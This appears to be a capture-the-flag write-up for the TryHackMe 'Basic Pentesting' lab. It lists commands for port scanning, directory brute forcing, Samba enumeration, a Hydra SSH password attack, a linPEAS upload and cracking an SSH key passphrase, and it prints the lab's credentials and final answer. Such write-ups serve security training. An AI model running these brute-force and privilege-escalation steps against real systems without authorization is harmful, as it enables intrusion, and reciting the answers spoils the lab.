# Basic Pentesting : web app testing and privEsc

## nmap

`nmap -sC -sV -o N nmap/initial $ip`

![nmap](https://github.com/oghobhainn/TryHackMe/blob/main/images/basicpentesting/basic-nmap.png)

### Open Ports

```
22 (ssh)
80 (website)
139
445 (samba)
```

## gobuster - port 80

`curl -o big.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt`

`gobuster dir -u http://$ip big.txt`

![gobuster](https://github.com/oghobhainn/TryHackMe/blob/main/images/basicpentesting/basic-gobuster.png)

## username and password bruteforcing

There is an old **samba** service, which is vulnerable. Let's enum it.

```
apt-get install enum4linux
enum4linux/enum4linux.pl -a $ip | tee enum4linux.log
```

We find two usernames, `jan` and `key`. We know by the comments on the website that __jan__'s password is weak. Let's use **Hydra**.

```
hydra -l $username -P /usr/share/wordlists/rockyou.txt ssh://$ip
```

## SSH into the machine

Credentials : `jan:armando`

## privEsv via LinPeas

```
git clone https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
scp linpeas.sh $username@$ip:/dev/shm
```

We find a private ssh key for __kay__ user !

but password-encoded, so we use __John The Ripper__, and find the password `beeswax` for the ssh connection.

Now we can ssh through it : `ssh -i privatekey_rsa kay@$ip` `password:beeswax`.

And we find the final answer into the `pass.bak` file : `hereisareallystrongpasswordthatfollowsthepasswordpolicy$$`
